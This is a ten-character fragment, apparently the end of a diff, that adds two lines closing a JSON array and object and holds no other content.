+    ]
+}
